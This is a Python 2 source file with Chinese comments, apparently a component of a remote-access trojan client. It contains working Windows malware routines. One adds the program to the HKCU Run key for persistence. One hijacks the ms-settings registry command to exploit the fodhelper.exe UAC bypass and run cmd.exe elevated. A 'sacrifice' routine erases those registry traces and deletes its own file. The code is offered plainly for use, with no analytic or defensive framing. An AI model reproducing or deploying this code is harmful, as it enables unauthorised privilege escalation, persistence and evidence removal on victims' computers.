# -*- coding: UTF-8 -*-
# ------------------- 注册表操作 -------------------

import sys
import os

RUN_KEY = r'Software\Microsoft\Windows\CurrentVersion\Run'
FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
CMD = r"C:\Windows\System32\cmd.exe"
UAC_REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DEFAULT_REG_KEY = None
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'


def create_reg_key(key, reg_path, value):
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    try:
        _winreg.CreateKey(HKCU, reg_path)
        reg_key = _winreg.OpenKey(HKCU, reg_path, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, key, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(reg_key)
    except WindowsError:
        raise


def delete_reg_key(key, reg_path):
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    try:
        reg_key = _winreg.OpenKey(HKCU, reg_path, 0, _winreg.KEY_ALL_ACCESS)
        _winreg.DeleteValue(reg_key, key)
        _winreg.CloseKey(reg_key)
    except WindowsError:
        pass


# ------------------ 持久运行 ------------------
def persistence(plat):
    # 修改 Windows 平台注册表（开机启动项）
    if plat == 'win':
        import _winreg
        from _winreg import HKEY_CURRENT_USER as HKCU

        bin_path = sys.argv[0]

        try:
            create_reg_key('br', RUN_KEY, bin_path)
            success = True
            details = "HKCU Run registry key applied"
        except WindowsError:
            success = False
            details = "HKCU Run registry key failed"
    elif plat == 'nix':
        success = False
        details = "nothing here yet"
    elif plat == 'mac':
        success = False
        details = "nothing here yet"
    else:
        return 'unknown platform'

    if success:
        results = 'Persistence successful, {}.'.format(details)
    else:
        results = 'Persistence unsuccessful, {}.'.format(details)

    return results


# ------------------ 自毁 ------------------
def sacrifice(plat):
    # 删除 Windows 注册表
    if plat == 'win':
        import _winreg
        from _winreg import HKEY_CURRENT_USER as HKCU
        try:
            delete_reg_key('br', RUN_KEY)
            delete_reg_key(DELEGATE_EXEC_REG_KEY, UAC_REG_PATH)
            delete_reg_key(DEFAULT_REG_KEY, UAC_REG_PATH)
        except WindowsError:
            pass

    elif plat == 'nix':
        pass

    elif plat == 'mac':
        pass

    # 删除客户端文件
    print sys.argv[0]
    os.remove(sys.argv[0])
    sys.exit(0)


# ------------------ 绕过 UAC ------------------
def bypass_uac(plat):
    if plat == 'win':
        try:
            create_reg_key(DELEGATE_EXEC_REG_KEY, UAC_REG_PATH, '')
            create_reg_key(DEFAULT_REG_KEY, UAC_REG_PATH, CMD)
            success = True
            details = "fodhelper.exe applied"
        except WindowsError:
            success = False
            details = "fodhelper.exe failed"
    elif plat == 'nix':
        success = False
        details = "nothing here yet"
    elif plat == 'mac':
        success = False
        details = "nothing here yet"
    else:
        return 'unknown platform'
    
    if success:
        results = 'UAC bypass successful, {}.'.format(details)
    else:
        results = 'UAC bypass unsuccessful, {}.'.format(details)

    return results